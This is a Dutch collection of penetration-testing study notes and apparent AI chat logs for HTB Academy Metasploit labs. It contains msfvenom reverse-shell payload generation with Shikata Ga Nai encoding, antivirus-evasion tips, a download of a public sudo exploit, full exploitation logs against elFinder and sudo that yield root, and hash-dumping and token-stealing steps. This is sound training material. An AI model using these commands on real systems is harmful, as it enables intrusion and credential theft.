Shikata Ga Nai (Japans voor "er is niets aan te doen") is de bekendste encoder in Metasploit. Het is een polymorfische encoder, wat betekent dat elke keer dat je hem gebruikt, de output er anders uitziet, ook al is de functie hetzelfde.
Werken met msfvenom

Tegenwoordig gebruik je de tool msfvenom om payloads te genereren en te encoderen.

    Zonder encoding: msfvenom -p windows/shell/reverse_tcp LHOST=127.0.0.1 -f perl

    Met encoding (Shikata Ga Nai): msfvenom -p windows/shell/reverse_tcp LHOST=127.0.0.1 -e x86/shikata_ga_nai -f perl

    Met meerdere iteraties: Je kunt de payload meerdere keren door de encoder halen om de structuur nog complexer te maken: msfvenom ... -e x86/shikata_ga_nai -i 10 -f exe -o virus.exe

Encoders in msfconsole

Wanneer je een exploit hebt geselecteerd in Metasploit, kun je zien welke encoders compatibel zijn met je huidige instellingen:
Bash

msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

Metasploit filtert deze lijst automatisch op basis van de architectuur van je target (bijv. x86 of x64).
De realiteit van AV Evasion

Zoals je in het VirusTotal-rapport in de tekst ziet, werd de "TeamViewerInstall.exe" door 51 van de 68 scanners gedetecteerd, zelfs na 10 iteraties van Shikata Ga Nai.

    Onthoud: Encoders zijn een hulpmiddel voor technische compatibiliteit. Voor echte "stealth" operaties heb je geavanceerdere technieken nodig zoals custom packers, obfuscatie of het direct in het geheugen laden van code (Reflective DLL Injection).


e hebt zojuist de kracht van de Metasploit Database ontdekt. Tijdens een penetratietest verzamel je enorme hoeveelheden data; zonder database is het onmogelijk om het overzicht te bewaren over welke hosts je hebt gescand, welke poorten openstaan en welke wachtwoorden je hebt buitgemaakt.
Waarom een Database gebruiken?

Metasploit gebruikt PostgreSQL op de achtergrond. De voordelen zijn groot:

    Geheugen: Je hoeft IP-adressen en poorten niet handmatig te onthouden; Metasploit slaat ze op.

    Automatisering: Je kunt variabelen zoals RHOSTS automatisch laten invullen op basis van eerdere scans.

    Samenwerking: Je kunt scanresultaten van tools zoals Nmap of Nessus importeren.

    Rapportage: Exporteer al je bevindingen (loot, credentials, hosts) aan het einde van je assessment.

De Essentiële Workflow
1. Initialisatie

Voordat je Metasploit start, moet de database draaien:
Bash

sudo systemctl start postgresql
sudo msfdb init
sudo msfdb run  # Start Metasploit en verbind direct

2. Workspaces: Je projectmappen

Gebruik Workspaces om verschillende klanten of projecten gescheiden te houden. Zo voorkom je dat data van "Target A" mengt met die van "Target B".

    workspace -a MijnProject: Maak een nieuwe workspace aan.

    workspace MijnProject: Wissel naar die workspace.

3. Data verzamelen (Nmap)

Je hoeft Metasploit niet te verlaten om te scannen. Gebruik db_nmap om de resultaten direct in de database te pompen:
Bash

msf6 > db_nmap -sV 10.129.4.71

Handige Database Commando's
Commando	Wat het doet
hosts	Toont alle ontdekte apparaten op het netwerk.
services	Toont alle open poorten en gedetecteerde softwareversies.
creds	Een overzicht van alle buitgemaakte gebruikersnamen en wachtwoorden.
loot	Toont gedownloade bestanden, zoals /etc/shadow of configuraties.
vulns	Een lijst met specifiek gevonden kwetsbaarheden per host.
Een Pro-tip voor Efficiëntie

Stel je hebt 10 hosts gescand met db_nmap en je wilt op allemaal een specifieke exploit proberen. In plaats van IP voor IP te typen, kun je dit doen:
Bash

msf6 > hosts -R

Dit commando vult de RHOSTS parameter van je huidige module automatisch in met alle actieve IP-adressen uit je database!


Je hebt nu een kijkje genomen in de keuken van de uitbreidbaarheid van Metasploit. Plugins en Mixins zijn de reden waarom Metasploit niet zomaar een tool is, maar een compleet ecosysteem dat kan meegroeien met je behoeften.
Plugins: De kracht van integratie

Plugins zijn externe softwaretools die direct in de msfconsole geladen kunnen worden. In plaats van te switchen tussen verschillende schermen (bijv. van Nessus naar Metasploit), brengt een plugin de commando's van die externe tool naar jouw huidige sessie.
Hoe gebruik je ze?

De meeste plugins staan in /usr/share/metasploit-framework/plugins. Je laadt ze simpelweg met het load commando:

    Laden: msf6 > load nessus of load sqlmap

    Help opvragen: Zodra een plugin geladen is, verschijnen er nieuwe commando's. Gebruik nessus_help of kijk onderaan je algemene help menu.

    Nieuwe toevoegen: Heb je een vette plugin op GitHub gevonden (zoals die van DarkOperator)? Kopieer het .rb bestand naar de plugin-map en je kunt hem direct gebruiken.

Populaire plugins

    Wmap: Een krachtige webapplicatie vulnerability scanner binnen MSF.

    Pentest: Voegt commando's toe voor snelle discovery en het automatiseren van post-exploitatie taken.

    Nessus/Nexpose: Voor het direct beheren van professionele vulnerability scans.

Mixins: De bouwstenen (Voor gevorderden)

Hoewel je als gebruiker niet direct Mixins hoeft te configureren, is het goed om te weten waarom Metasploit zo stabiel is. Omdat Metasploit in Ruby is geschreven, kunnen ontwikkelaars "Mixins" gebruiken om functies te delen tussen verschillende modules.

    Vergelijking: Denk aan Mixins als de "specerijen" in een keuken. Je hebt een module voor een exploit (het hoofdgerecht), en je "mix" daar functies in zoals HTTP, TCP, of SMB (de specerijen). Hierdoor hoeft een programmeur niet elke keer opnieuw uit te leggen hoe een HTTP-verbinding werkt; hij "includeert" simpelweg de HTTP-mixin.

Waarom is dit belangrijk voor jou?

Door plugins zoals pentest.rb te gebruiken, kun je taken automatiseren die normaal veel tijd kosten, zoals:

    Discovery: Automatisch je database vullen met actieve hosts.

    Auto-exploit: Matchen van gevonden kwetsbaarheden aan beschikbare modules.

    Credential harvesting: In één klap alle wachtwoorden uit verschillende actieve sessies trekken.


# HTB Academy - Web Application Exploitation Challenge

Laten we deze challenge systematisch aanpakken. We hebben drie vragen die opbouwen naar root access.

---

## Vraag 1: Web Application Identificatie

### Stap 1: Nmap Scan

bash

```bash
nmap -sV -p- 10.129.4.82
```

Of sneller:

bash

```bash
nmap -sV --top-ports 1000 10.129.4.82
```

### Stap 2: Web Application Vinden

bash

```bash
# Check de hoofdpagina
curl http://10.129.4.82

# Of in de browser (als je GUI hebt)
firefox http://10.129.4.82 &
```

### Stap 3: HTML Source Code Inspecteren

bash

```bash
# Download en bekijk de HTML
curl http://10.129.4.82 > index.html
cat index.html

# Of zoek naar hints
curl http://10.129.4.82 | grep -i "powered by\|generator\|application\|version"

# Bekijk meta tags
curl http://10.129.4.82 | grep -i "<meta"

# Kijk naar comments
curl http://10.129.4.82 | grep "<!--"
```

### Veelvoorkomende Locaties voor Application Names:

bash

```bash
# In HTML comments
<!-- Powered by [APPLICATION_NAME] -->

# In meta tags
<meta name="generator" content="[APPLICATION_NAME]">

# In footer
<footer>Powered by [APPLICATION_NAME]</footer>

# In JavaScript paths
<script src="/assets/[application]/app.js">

# In CSS paths
<link href="/[application]/style.css">
```

---

## Vraag 2: Exploitatie en Username

### Na het vinden van de applicatie naam:

bash

```bash
msfconsole -q
search [application_name]
```

### Bijvoorbeeld als het "Webmin" is:

ruby

```ruby
search webmin
use exploit/unix/webapp/webmin_[specifieke_exploit]
show options
set RHOSTS 10.129.4.82
set RPORT [poort_van_webserver]
set LHOST tun0
show targets
exploit
```

### Username Vinden

Zodra je een shell hebt:

bash

```bash
# In Meterpreter:
meterpreter > getuid

# Of in een normale shell:
whoami
id
```

---

## Vraag 3: Sudo Privilege Escalation naar Root

### Stap 1: Check Sudo Versie

In je shell:

bash

```bash
sudo --version
# Of:
sudo -V
```

### Stap 2: Zoek de Exploit

**Bekende oude sudo kwetsbaarheden:**

- **CVE-2021-3156 (Baron Samedit)** - Sudo < 1.9.5p2
- **CVE-2019-14287** - Sudo < 1.8.28

bash

```bash
# In Metasploit:
search sudo
search cve-2021-3156
search baron samedit
```

### Stap 3: Gebruik de Exploit

#### Optie A: Via Metasploit

ruby

```ruby
# Background je huidige sessie
background

# Zoek sudo exploits
search sudo privilege

# Gebruik bijvoorbeeld:
use exploit/linux/local/sudo_baron_samedit
show options
set SESSION 1  # Je bestaande sessie nummer
set LHOST tun0
exploit
```

#### Optie B: Handmatig (CVE-2021-3156)

bash

```bash
# Download de exploit
wget https://github.com/blasty/CVE-2021-3156/raw/main/hax.c

# Of via msfvenom als je al een Meterpreter sessie hebt:
meterpreter > upload /path/to/exploit.c /tmp/exploit.c
meterpreter > shell

# Compileer op het target
cd /tmp
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

### Stap 4: Vind de Flag

Als root:

bash

```bash
# Zoek de flag
find / -name flag.txt 2>/dev/null

# Veelvoorkomende locaties:
cat /root/flag.txt
cat /home/*/flag.txt
cat /flag.txt
```

---

## Complete Workflow Voorbeeld

Laten me je een complete walkthrough geven voor een veelvoorkomende scenario:

### Scenario: Het is Webmin

bash

```bash
# 1. Scan
nmap -sV -p- 10.129.4.82

# Output: Port 10000 - Webmin 1.x.x

# 2. HTML Check
curl http://10.129.4.82:10000 | grep -i "webmin"
```

**Antwoord Vraag 1:** `webmin`

ruby

```ruby
# 3. Metasploit
msfconsole -q
search webmin
use exploit/unix/webapp/webmin_show_cgi_exec
set RHOSTS 10.129.4.82
set RPORT 10000
set SSL true  # Webmin gebruikt vaak HTTPS
set LHOST tun0
exploit

# 4. Check username
meterpreter > getuid
# Output: uid=1000(webmin) gid=1000(webmin)
```

**Antwoord Vraag 2:** `webmin` (of welke user dan ook)

ruby

```ruby
# 5. Check sudo version
meterpreter > shell
sudo --version
# Output: Sudo version 1.8.21

# 6. Background en privilege escalation
background
search sudo 1.8
use exploit/linux/local/sudo_baron_samedit
set SESSION 1
set LHOST tun0
exploit

# 7. Find flag
cat /root/flag.txt
```

**Antwoord Vraag 3:** `HTB{...}`

---

## Troubleshooting Tips

### Probleem: Kan HTML source niet zien

bash

```bash
# Probeer verschillende URL's:
curl http://10.129.4.82/
curl http://10.129.4.82/index.html
curl http://10.129.4.82/index.php

# Check robots.txt
curl http://10.129.4.82/robots.txt

# Directory listing
curl http://10.129.4.82/admin/
curl http://10.129.4.82/app/
```

### Probleem: Exploit werkt niet

ruby

```ruby
# Check alle opties nauwkeurig
show options
show advanced

# Probeer verschillende targets
show targets
set target 1

# Probeer verschillende payloads
show payloads
set payload cmd/unix/reverse_bash
```

### Probleem: Geen sudo exploit in Metasploit

bash

```bash
# Download handmatig:
meterpreter > upload /usr/share/exploitdb/exploits/linux/local/[exploit].c /tmp/exploit.c
meterpreter > shell
cd /tmp
gcc exploit.c -o exploit
./exploit

# Of gebruik een pre-compiled binary
meterpreter > upload /path/to/compiled/exploit /tmp/pwn
meterpreter > shell
chmod +x /tmp/pwn
/tmp/pwn
```

---

## Start Hier:

Voer deze commands uit en deel de output:

bash

```bash
# 1. Scan het target
nmap -sV --top-ports 1000 10.129.4.82

# 2. Check de web app
curl http://10.129.4.82 | head -50

# 3. Zoek in HTML naar hints
curl http://10.129.4.82 | grep -i "powered\|generator\|application" -A 2 -B 2
```


┌──(kali㉿kali)-[~]
└─$ nmap -sV --top-ports 1000 10.129.4.82
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-29 18:17 -0500
Nmap scan report for 10.129.4.82
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.94 seconds

																curl http://10.129.4.82    laat zien:  elfinder
											   
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf > use exploit/linux/http/elfinder_archive_cmd_execution
[-] No results from search
[-] Failed to load module: exploit/linux/http/elfinder_archive_cmd_execution
msf > search elfinder

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection                                                                                        
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection                                                                         


Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection                                                                                           

msf > use 3
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf exploit(linux/http/elfinder_archive_cmd_injection) > set RHOSTS 10.129.4.82
RHOSTS => 10.129.4.82
msf exploit(linux/http/elfinder_archive_cmd_injection) > set LHOST 10.10.14.114
LHOST => 10.10.14.114
msf exploit(linux/http/elfinder_archive_cmd_injection) > run
[*] Started reverse TCP handler on 10.10.14.114:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. elFinder running version 2.1.53
[*] Uploading file DBtcDZ.txt to elFinder
[+] Text file was successfully uploaded!
[*] Attempting to create archive zvtHUq.zip
[+] Archive was successfully created!
[*] Using URL: http://10.10.14.114:8080/P49fWQe6
[*] Client 10.129.4.82 (Wget/1.20.3 (linux-gnu)) requested /P49fWQe6
[*] Sending payload to 10.129.4.82 (Wget/1.20.3 (linux-gnu))
[*] Command Stager progress -  50.91% done (56/110 bytes)
[*] Command Stager progress -  70.91% done (78/110 bytes)
[*] Sending stage (1062760 bytes) to 10.129.4.82
[+] Deleted DBtcDZ.txt
[+] Deleted zvtHUq.zip
[*] Meterpreter session 1 opened (10.10.14.114:4444 -> 10.129.4.82:53792) at 2026-01-29 18:26:48 -0500
[*] Command Stager progress -  82.73% done (91/110 bytes)
[*] Command Stager progress - 100.00% done (110/110 bytes)
[*] Server stopped.

meterpreter > shell
Process 1739 created.
Channel 1 created.
whoami
www-data
exit
meterpreter > Interrupt: use the 'exit' command to quit
meterpreter > 
Background session 1? [y/N]  
msf exploit(linux/http/elfinder_archive_cmd_injection) > use exploit/linux/local/sudo_baron_samedit
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf exploit(linux/local/sudo_baron_samedit) > set SESSION 1
SESSION => 1
msf exploit(linux/local/sudo_baron_samedit) > set LHOST 10.10.14.114
LHOST => 10.10.14.114
msf exploit(linux/local/sudo_baron_samedit) > run
[*] Started reverse TCP handler on 10.10.14.114:4444 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: x86
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] Writing '/tmp/KIhLC7jg.py' (763 bytes) ...
[*] Writing '/tmp/libnss_/asWMSi .so.2' (540 bytes) ...
[*] Sending stage (3090404 bytes) to 10.129.4.82
[+] Deleted /tmp/KIhLC7jg.py
[+] Deleted /tmp/libnss_/asWMSi .so.2
[+] Deleted /tmp/libnss_
[*] Meterpreter session 2 opened (10.10.14.114:4444 -> 10.129.4.82:53866) at 2026-01-29 18:32:29 -0500

meterpreter > shell
Process 1929 created.
Channel 1 created.
whoami
root
cat /root/flag.txt
HTB{5e55ion5_4r3_sw33t}


Gefeliciteerd met het behalen van de vlag op de Linux-target! Je hebt nu de overstap gemaakt naar de theorie over Meterpreter, de "Swiss Army Knife" van de penetratietester.

Zoals je in je eigen exploit zag, is Meterpreter niet zomaar een shell; het is een krachtige agent die volledig in het geheugen (RAM) draait. Hierdoor laat het bijna geen sporen achter op de harde schijf, wat het zeer lastig maakt voor forensisch onderzoekers om je acties terug te vinden.
Kernpunten van Meterpreter

    Stealthy: Geen nieuwe processen; het injecteert zichzelf in bestaande processen (zoals explorer.exe op Windows of apache op Linux).

    Powerful: Het biedt commando's die normaal gesproken tientallen handmatige stappen zouden kosten, zoals hashdump om wachtwoord-hashes te stelen.

    Extensible: Je kunt extra modules laden terwijl de sessie al loopt (bijvoorbeeld load kiwi voor Mimikatz-functionaliteit).

Belangrijke commando's die je nu moet kennen

Nu je een actieve sessie hebt gehad, zijn dit de commando's die je post-exploitatie naar een hoger niveau tillen:
Commando	Beschrijving
getuid	Laat zien als welke gebruiker je op de server draait.
sysinfo	Geeft details over het OS en de architectuur (x86 vs x64).
ps	Toont alle draaiende processen (handig om te zien waar je naar kunt migreren).
migrate [PID]	Verplaatst je Meterpreter-sessie naar een ander proces voor stabiliteit.
upload / download	Bestanden uitwisselen tussen jouw machine en de target.
hashdump	Extraheert de database met wachtwoord-hashes (vereist root/admin).
De "Baron Samedit" Ervaring vs. Windows

In de tekst die je stuurde, zie je een voorbeeld van een Windows-aanval via IIS 6.0. Merk op dat de workflow bijna hetzelfde is als wat jij zojuist deed op Linux:

    Exploit uitvoeren -> Beperkte shell krijgen.

    Post-module gebruiken (local_exploit_suggester op Windows, jouw handmatige Sudo-check op Linux).

    Privilege Escalation -> Root of SYSTEM worden.

Volgende Stap

In het lab dat je zojuist hebt gedaan, was de sudo_baron_samedit de sleutel. Op Windows-systemen zou je vaak getsystem proberen of tokens stelen met steal_token.


Het Metasploit Framework Gebruiken

Pagina 11: Meterpreter
Wat is Meterpreter?

De Meterpreter Payload is een veelzijdige, uitbreidbare payload die gebruikmaakt van DLL-injectie. Dit zorgt voor een stabiele verbinding met de host van het slachtoffer die moeilijk te detecteren is met eenvoudige controles. Het kan worden geconfigureerd om persistent te blijven na een herstart.

Meterpreter bevindt zich volledig in het geheugen (RAM) van de externe host en laat geen sporen achter op de harde schijf, wat detectie door conventionele forensische technieken bemoeilijkt.

Het wordt niet voor niets het "Zwitserse zakmes van pentesting" genoemd. Het doel van Meterpreter is om post-exploitatieprocedures te verbeteren door een selectie tools aan te bieden voor eenvoudige enumeratie van binnenuit. Het helpt bij:

    Vinden van privilege escalation technieken.

    AV (Antivirus) evasie.

    Verder onderzoek naar kwetsbaarheden.

    Persistentie en pivoting (doorstoten naar andere netwerken).

Meterpreter Uitvoeren

Om Meterpreter te draaien, selecteer je simpelweg een versie uit de show payloads output, rekening houdend met het type verbinding en het doel-OS.

Wanneer een exploit slaagt, gebeurt het volgende:

    Stager: Het doelwit voert de initiële stager uit (bijv. bind, reverse, findtag).

    Reflective Loading: De stager laadt de DLL met het voorvoegsel "Reflective". De Reflective stub regelt het laden/injecteren van de DLL.

    Initialisatie: De Meterpreter-core start op, zet een AES-versleutelde verbinding op en stuurt een GET-verzoek. Metasploit ontvangt dit en configureert de client.

    Extensies: Ten slotte laadt Meterpreter extensies zoals stdapi en priv (voor beheerdersrechten). Alles verloopt via AES-encryptie.

Zodra de payload draait, ontvang je een Meterpreter shell. Gebruik het commando help om alle mogelijkheden te zien.
MSF - Meterpreter Commando's (Core)
Commando	Beschrijving
? / help	Helpmenu weergeven.
background / bg	Huidige sessie naar de achtergrond verplaatsen.
exit / quit	De Meterpreter-sessie beëindigen.
guid / uuid	Sessie-ID's ophalen.
info	Informatie over een Post-module tonen.
load / use	Meterpreter-extensies laden.
migrate	De server naar een ander proces verplaatsen.
pivot	Pivot-listeners beheren.
run	Een script of Post-module uitvoeren.
sessions	Snel schakelen naar een andere sessie.

Meterpreter is ontworpen om Stealthy (onopvallend), Powerful (krachtig) en Extensible (uitbreidbaar) te zijn. Het draait volledig in het geheugen, gebruikt versleutelde communicatie en kan procesmigratie uitvoeren om detectie te voorkomen.
Meterpreter in de Praktijk
1. Scannen van het doelwit

We beginnen met een scan vanuit de msfconsole om data direct in de database op te slaan:
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

De scan laat zien dat er Microsoft IIS 6.0 draait op poort 80. Onderzoek wijst uit dat dit versienummer kwetsbaar is voor CVE-2017-7269 (WebDAV).
2. De Exploit configureren

We zoeken de module en stellen de opties in:
Bash

msf6 > search iis_webdav_upload_asp
msf6 > use 0
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

3. Privileges en Migratie

Na het verkrijgen van een shell, blijkt dat we beperkte rechten hebben (Access is denied bij getuid). We gebruiken ps om processen te zien en steal_token om de identiteit van een actiever proces over te nemen:
meterpreter > steal_token 1836 -> Nu zijn we NETWORK SERVICE.
4. Privilege Escalation

We gebruiken de local_exploit_suggester om manieren te vinden om Administrator/SYSTEM te worden:

    Zet de sessie in de achtergrond (bg).

    use post/multi/recon/local_exploit_suggester.

    set SESSION 1 en run.

De suggester stelt ms15_051_client_copy_image voor. Na het uitvoeren van deze exploit verkrijgen we een nieuwe sessie met volledige SYSTEM rechten.
5. Loot verzamelen (Hashes dumpen)

Met SYSTEM-rechten kunnen we inloggegevens bemachtigen:

    hashdump: Haalt lokale wachtwoord-hashes op.

    lsa_dump_sam: Dumpt de Security Account Manager database.

    lsa_dump_secrets: Haalt LSA-geheimen op, zoals service-wachtwoorden.


opdracht:

Ik zie dat je een document hebt gedeeld over Metasploit Framework en Meterpreter uit wat lijkt op CPTS (Certified Penetration Testing Specialist) cursusmateriaal.

Je hebt echter nog geen specifieke vraag gesteld. Waar kan ik je mee helpen? Bijvoorbeeld:

    Uitleg van concepten: Wil je dat ik bepaalde onderdelen van Meterpreter of de exploit uitleg?
    Samenvatting: Heb je een overzicht nodig van de belangrijkste punten?
    Opdracht hulp: Heb je een specifieke CPTS lab opdracht waar je hulp bij nodig hebt?
    Technische vragen: Wil je meer weten over hoe bepaalde commando's of technieken werken?

Laat me weten wat je precies nodig hebt!

2 vragen:  Target(s): 10.129.8.99 (ACADEMY-MSF2-WIN02) 

 Life Left: 115 minute(s)

    1 Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

+10 Streak pts

    1 Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.

+10 Streak pts
3:11 AM

De gebruiker heeft twee vragen over een CPTS lab opdracht met target 10.129.8.99. Laten we de vragen analyseren:

Vraag 1: Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

Vraag 2: Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.

Gebaseerd op het document dat ze hebben gedeeld, gaat dit waarschijnlijk over een IIS WebDAV exploit (zoals in het voorbeeld). De stappen zouden zijn:

    Scan de target met nmap
    Identificeer de service (waarschijnlijk IIS)
    Zoek naar de juiste exploit in Metasploit
    Configureer de exploit
    Krijg een Meterpreter shell
    Check welke user je bent (getuid)
    Dump de hashes

Ik moet de gebruiker helpen met de juiste stappen, maar ik kan niet de exacte antwoorden geven omdat ik de target niet kan scannen. Ik kan wel uitleggen welke commando's ze moeten gebruiken.
Done

Ik zal je helpen met beide vragen! Laten we stap voor stap door het proces gaan:
Vraag 1: Username van de initial shell

Stap 1: Scan de target
bash

msfconsole
db_nmap -sV -p- -A 10.129.8.99
```

**Stap 2: Zoek naar de exploit**
Gebaseerd op het document, zoek naar de IIS WebDAV exploit:
```
search iis_webdav_upload_asp
use exploit/windows/iis/iis_webdav_upload_asp
```

**Stap 3: Configureer de exploit**
```
set RHOSTS 10.129.8.99
set LHOST <jouw-IP>  # meestal tun0
show options
```

**Stap 4: Run de exploit**
```
exploit
# of
run
```

**Stap 5: Check de username**
Zodra je een Meterpreter shell hebt:
```
getuid
```

Dit commando geeft je de username. Vaak is dit iets zoals:
- `NT AUTHORITY\NETWORK SERVICE`
- `NT AUTHORITY\LOCAL SERVICE`
- Of een specifieke user

---

## Vraag 2: NTLM hash voor "htb-student"

Eenmaal in je Meterpreter shell:

**Optie 1: hashdump**
```
hashdump
```

**Optie 2: lsa_dump_sam** (meer gedetailleerd)
```
lsa_dump_sam

Zoek in de output naar de regel met "htb-student" en kopieer de NTLM hash (het tweede deel na de dubbele punt).

Format: username:RID:LM_hash:NTLM_hash:::

Je moet alleen het NTLM_hash gedeelte submitten.

Tip: Als hashdump faalt met "Access is denied", moet je mogelijk:

    Privilege escalation doen (zoals in het document met ms15_051_client_copy_image)
    Of processen migreren naar een hoger privilege proces

Probeer deze stappen en laat me weten waar je vastloopt! 🎯

Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Ac
                                                  cepted: move, copy)
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]. Su
                                                  pported proxies: sapni, socks4, http, socks5, socks5h
   RHOSTS                               yes       The target host(s), see https://docs.metasploit.com/docs/using-m
                                                  etasploit/basics/using-metasploit.html
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.170.130  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Automatic
View the full module info with the info, or info -d command.
msf exploit(windows/iis/iis_webdav_upload_asp) > set lhost 10.10.14.17
lhost => 10.10.14.17
msf exploit(windows/iis/iis_webdav_upload_asp) > set rhosts 10.129.8.99
rhosts => 10.129.8.99
msf exploit(windows/iis/iis_webdav_upload_asp) > run
[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] Checking /metasploit168973864.asp
[-] Connection timed out while trying to checking /metasploit168973864.asp
[*] Exploit completed, but no session was created.
4:03 AM

De exploit faalt met een connection timeout. Dit kan verschillende redenen hebben:

    De target draait misschien niet op poort 80, of heeft een andere poort voor HTTP
    Er kan een firewall zijn
    De service draait misschien niet
    Er kan een ander probleem zijn met de verbinding

Laten me de user helpen met troubleshooting:

    Eerst een nmap scan doen om te zien welke poorten open zijn
    Controleren of IIS WebDAV wel draait
    Mogelijk een andere exploit gebruiken

De user moet eerst een scan doen om te zien wat er open is.
Done

De exploit faalt omdat er een connection timeout is. Laten we troubleshooten:
Stap 1: Scan de target eerst goed
bash

# In msfconsole:
db_nmap -sV -p- -T4 10.129.8.99

# Of buiten msfconsole:
nmap -sV -sC -p- 10.129.8.99

Dit toont je:

    Welke poorten open zijn
    Welke services draaien
    De versies van de services

Mogelijke problemen:
1. Verkeerde poort

Misschien draait de webserver niet op poort 80, maar op een andere poort (bijv. 8080, 8000, etc.)
bash

# Als de scan bijv. poort 8080 toont:
set RPORT 8080

2. Andere exploit nodig

Afhankelijk van de scan resultaten, kan je een andere exploit nodig hebben. Bijvoorbeeld:

    Voor IIS 6.0: exploit/windows/iis/iis_webdav_scstoragepathfromurl
    Voor andere versies: andere exploits

bash

# Zoek naar relevante exploits:
search iis
search type:exploit platform:windows iis

3. Check connectiviteit
bash

# Test of je de target kan bereiken:
ping 10.129.8.99

# Test of poort 80 open is:
nc -zv 10.129.8.99 80
# Of via nmap:
nmap -p 80 10.129.8.99

Volgende stappen:

Run eerst deze scan en deel de output:
bash

nmap -sV -sC -p- -T4 10.129.8.99

Dan kan ik je helpen de juiste exploit en configuratie te vinden! 🎯

└─$ nmap 10.129.8.99
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 03:21 -0500
Nmap scan report for 10.129.8.99
Host is up (0.064s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5000/tcp open  upnp
5985/tcp open  wsman
4:04 AM

Aha! Ik zie nu het probleem. De target heeft GEEN poort 80 open (geen IIS webserver). De open poorten zijn:

    135: msrpc
    139: netbios-ssn
    445: microsoft-ds (SMB)
    3389: ms-wbt-server (RDP)
    5000: upnp
    5985: wsman (WinRM)

Dit betekent dat we een ANDERE exploit moeten gebruiken, niet de IIS WebDAV exploit. Gezien de open poorten, zijn de meest waarschijnlijke aanvalsvectoren:

    SMB (poort 445) - bijvoorbeeld EternalBlue of andere SMB exploits
    WinRM (poort 5985) - als we credentials hebben
    Port 5000 - dit is interessant, mogelijk een webservice

Laten me een betere scan suggereren om te zien wat er op deze poorten draait, en dan kunnen we de juiste exploit vinden.
Done

Perfect! Nu zie ik het probleem - er is geen poort 80 open, dus de IIS WebDAV exploit zal niet werken!

De target heeft deze open poorten:

    135 (msrpc)
    139 (netbios-ssn)
    445 (microsoft-ds/SMB)
    3389 (RDP)
    5000 (upnp)
    5985 (WinRM)

Stap 1: Gedetailleerde scan

Laten we meer info verzamelen:
bash

nmap -sV -sC -p 135,139,445,3389,5000,5985 10.129.8.99

Stap 2: Zoek exploits in Metasploit

Ga terug naar msfconsole en probeer deze opties:
Optie A: SMB Exploits (poort 445)
bash

search type:exploit platform:windows smb

Populaire Windows SMB exploits:

    exploit/windows/smb/ms17_010_eternalblue (Windows 7/2008)
    exploit/windows/smb/ms08_067_netapi (Windows XP/2003)

Optie B: Poort 5000 (mogelijk een webservice)
bash

# Check wat er op poort 5000 draait:
curl http://10.129.8.99:5000
# Of in browser: http://10.129.8.99:5000

Optie C: WinRM (poort 5985)

Als je credentials zou hebben (wat je niet hebt in dit stadium).
Probeer dit:

In msfconsole:
bash

# Scan vanuit MSF voor betere info:
db_nmap -sV -sC -p 135,139,445,3389,5000,5985 10.129.8.99

# Kijk naar de resultaten en zoek dan naar relevante exploits
search ms17_010
search smb

Deel de output van de gedetailleerde scan, dan kan ik je precies vertellen welke exploit je moet gebruiken! 🎯

─$ nmap -sV -sC -Pn -p 135,139,445,3389,5000,5985 10.129.8.99
